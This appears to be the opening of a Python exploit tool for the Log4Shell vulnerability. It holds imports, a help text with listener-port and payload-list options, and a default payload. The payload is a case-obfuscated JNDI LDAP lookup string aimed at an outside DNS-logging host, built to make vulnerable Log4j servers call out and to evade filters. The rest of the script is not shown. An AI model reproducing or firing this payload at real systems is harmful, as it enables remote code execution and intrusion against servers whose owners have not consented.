import re
import sys
import time
import socket
import codecs
import getopt
import requests
import warnings
import threading
import subprocess
import multiprocessing
from modules.log import logErr
from modules.scan import payloads
warnings.filterwarnings("ignore")

helper = '''
Exploit Options:
    -h
    \tShow helper
    -l port
    \tListener port
    -j <num>
    \tPayload id
    -l
    \tShow payload list
'''

default_payload = '${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${' \
                  'lower:p}://payload_id.pp.ns.cmbdnslog.biz/status}} '

